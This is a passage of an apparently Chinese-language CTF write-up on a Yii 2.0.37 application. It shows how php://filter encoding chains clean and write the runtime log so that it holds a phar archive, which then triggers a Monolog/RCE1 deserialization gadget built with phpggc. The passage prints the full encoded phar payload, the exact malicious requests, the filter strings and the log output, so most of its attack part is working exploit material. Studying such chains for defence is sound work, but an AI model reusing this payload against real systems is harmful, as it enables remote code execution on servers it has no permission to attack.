0A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D%3D00%3D0A payload前面可以插入&gt;=15的任意数量的字符 现在可以分析，如何控字节数，我们发了两个请求，所以除去我们的payload部分，已经是偶数了，只要保证第一次请求的payload和第二次请求的payload加起来的字符数为偶数即可，就可以满足log中字节数为偶数的条件 我们可以控制的是第一个payload的长度，和 第二个payload前面字符的长度，而第二个payload有效部分已经是偶数了，所以简化成第一个payload加上第二个payload前面额外添加的字符数为偶数 还有一个条件，我们有效payload前面的字节数需要为偶数，在满足前面所有条件的情况下，我们可以在第二个payload首尾各添加n个字符实现，这样既不会影响全体奇偶性，也可以改变有效payload前面字符数的奇偶 0x04 构造payload解题下面是本地测试，实际做题可能由于环境不同需要做出改变 首先清空日志 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log 发出第一个出错请求 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx 通过phpggc生成phar，再经过上面的处理可以获取有效payload 发出第二个出错请求，插入payload 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00n%3D00l%3D00Y%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00D%3D00G%3D00x%3D00J%3D00s%3D00N%3D008%3D00T%3D00m%3D00i%3D00e%3D00m%3D00D%3D009%3D00t%3D00b%3D00O%3D00M%3D00J%3D00u%3D006%3D001%3D00%2F%3D00m%3D004%3D00%2B%3D00U%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D 现在的日志为 123456789101112131415161718192021222324252021-08-06 15:43:45 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\\base\\ErrorException:2] yii\\base\\ErrorException: file_get_contents(xxxxxxxxxxxxxxx): failed to open stream: No such file or directory in E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php:65Stack trace:#0 [internal function]: yii\\base\\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\\\phpstudy\\\\PHP...&#39;, 65, Array)#1 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx&#39;)#2 [internal function]: app\\controllers\\SiteController-&gt;actionIndex()#3 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(57): call_user_func_array(Array, Array)#4 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Controller.php(181): yii\\base\\InlineAction-&gt;runWithParams(Array)#5 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Module.php(534): yii\\base\\Controller-&gt;runAction(&#39;index&#39;, Array)#6 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\web\\Application.php(104): yii\\base\\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)#7 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Application.php(392): yii\\web\\Application-&gt;handleRequest(Object(yii\\web\\Request))#8 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\web\\index.php(12): yii\\base\\Application-&gt;run()#9 &#123;main&#125;2021-08-06 15:44:02 [127.0.0.1][-][m5eo8a3oid4qokv39jervs5cs8][error][yii\\base\\ErrorException:2] yii\\base\\ErrorException: file_get_contents(xxxxxxxxxxxxxxx&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00 &#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00v&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00Y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00d&#x3D;002&#x3D;00h&#x3D;00v&#x3D;00Y&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00G&#x3D;00x&#x3D;00J&#x3D;00s&#x3D;00N&#x3D;008&#x3D;00T&#x3D;00m&#x3D;00i&#x3D;00e&#x3D;00m&#x3D;00D&#x3D;009&#x3D;00t&#x3D;00b&#x3D;00O&#x3D;00M&#x3D;00J&#x3D;00u&#x3D;006&#x3D;001&#x3D;00&#x2F;&#x3D;00m&#x3D;004&#x3D;00 &#x3D;00U&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;3D): failed to open stream: Invalid argument in E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php:65Stack trace:#0 [internal function]: yii\\base\\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\\\phpstudy\\\\PHP...&#39;, 65, Array)#1 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\controllers\\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx...&#39;)#2 [internal function]: app\\controllers\\SiteController-&gt;actionIndex()#3 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\InlineAction.php(57): call_user_func_array(Array, Array)#4 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Controller.php(181): yii\\base\\InlineAction-&gt;runWithParams(Array)#5 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Module.php(534): yii\\base\\Controller-&gt;runAction(&#39;index&#39;, Array)#6 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\web\\Application.php(104): yii\\base\\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)#7 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\vendor\\yiisoft\\yii2\\base\\Application.php(392): yii\\web\\Application-&gt;handleRequest(Object(yii\\web\\Request))#8 E:\\phpstudy\\PHPTutorial\\WWW\\yii-2.0.37\\web\\index.php(12): yii\\base\\Application-&gt;run()#9 &#123;main&#125; 经过验证，刚好符合偶数的两个条件，进行编码解码 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log 看结果，如果结果为空，那是payload前面的字节数成单数了，给payload前后各加一个字符可以解决，如果第一次成功就不用加了，如果失败，也是重新再来一次而已 可以看到，我们已经构造出phar文件了，接下来就找链子，打了 解题 根据上面步骤 链子用这个 1.&#x2F;phpggc Monolog&#x2F;RCE1 &quot;phpinfo&quot; &quot;1&quot; --phar phar&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;payload 将phar处理一下(php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode/resource=payload) 得到 payload 1&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00r&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00U&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00M&#x3D;00S&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;001&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;002&#x3D;00Z&#x3D;00W&#x3D;00w&#x3D;00i&#x3D;00O&#x3D;000&#x3D;004&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00N&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00W&#x3D;005&#x3D;00p&#x3D;00d&#x3D;00G&#x3D;00l&#x3D;00h&#x3D;00b&#x3D;00G&#x3D;00l&#x3D;006&#x3D;00Z&#x3D;00W&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00I&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00M&#x3D;00a&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00t&#x3D;00M&#x3D;00T&#x